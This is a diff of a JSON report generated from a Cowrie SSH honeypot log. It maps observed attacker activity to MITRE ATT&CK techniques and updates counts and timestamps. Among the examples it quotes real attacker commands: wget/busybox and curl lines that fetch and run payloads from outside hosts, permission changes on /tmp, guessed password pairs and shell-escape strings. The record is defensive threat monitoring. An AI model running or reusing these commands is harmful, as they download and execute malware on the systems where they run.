@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-13 02:03:11",
+  "generated": "2026-08-13 03:03:42",
   "totals": {
-    "commands": 196,
-    "login_failed": 984,
-    "login_success": 18,
-    "sessions": 1084
+    "commands": 543,
+    "login_failed": 1065,
+    "login_success": 24,
+    "sessions": 1166
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 984,
+      "count": 1065,
       "examples": [
         "user1 / 123456",
         "root / 1234567",
@@ -21,14 +21,14 @@
         "user1 / 12345678"
       ],
       "first": "2026-08-13T00:00:04.398982Z",
-      "last": "2026-08-13T02:03:09.954031Z",
-      "unique_ips": 31
+      "last": "2026-08-13T03:03:41.743779Z",
+      "unique_ips": 39
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 93,
+      "count": 153,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -37,14 +37,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-13T00:01:53.648846Z",
-      "last": "2026-08-13T01:22:56.564606Z",
-      "unique_ips": 8
+      "last": "2026-08-13T02:57:51.716957Z",
+      "unique_ips": 12
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 28,
+      "count": 44,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -53,14 +53,14 @@
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh"
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T01:22:56.564606Z",
-      "unique_ips": 7
+      "last": "2026-08-13T02:57:51.716957Z",
+      "unique_ips": 11
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 18,
+      "count": 24,
       "examples": [
         "root / root",
         "root / 123@@@",
@@ -69,20 +69,20 @@
         "orangepi / orangepi"
       ],
       "first": "2026-08-13T00:01:49.585213Z",
-      "last": "2026-08-13T01:38:08.429346Z",
-      "unique_ips": 16
+      "last": "2026-08-13T02:57:12.671758Z",
+      "unique_ips": 22
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 10,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-13T00:01:55.509663Z",
-      "last": "2026-08-13T01:22:20.306290Z",
-      "unique_ips": 6
+      "last": "2026-08-13T02:57:15.633166Z",
+      "unique_ips": 10
     },
     {
       "id": "T1082",
@@ -164,43 +164,47 @@
   "unmapped": [
     [
       "/bin/busybox",
-      42
+      275
     ],
     [
-      "enable",
-      6
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      16
     ],
     [
       "system",
-      6
+      11
     ],
     [
       "shell",
-      6
+      11
     ],
     [
       "sh",
-      6
+      11
+    ],
+    [
+      "enable",
+      10
     ],
     [
       "linuxshell",
-      6
+      10
     ],
     [
       "enablelinuxshell",
-      6
+      10
     ],
     [
       "ping ;sh",
-      6
-    ],
-    [
-      "busybox",
-      6
+      10
     ],
     [
       "cd /proc && cat self/cmdline",
-      6
+      10
+    ],
+    [
+      "busybox",
+      8
     ],
     [
       "command -v python3 >/dev/null 2>&1 || (command -v apt-get >/dev/null 2>&1 && timeout 30 apt-get update -y; apt-get insta",
@@ -212,6 +216,10 @@
     ],
     [
       "rm -f /tmp/bendi.py",
+      1
+    ],
+    [
+      "/bin/busybox UNSTABLE",
       1
     ]
   ]
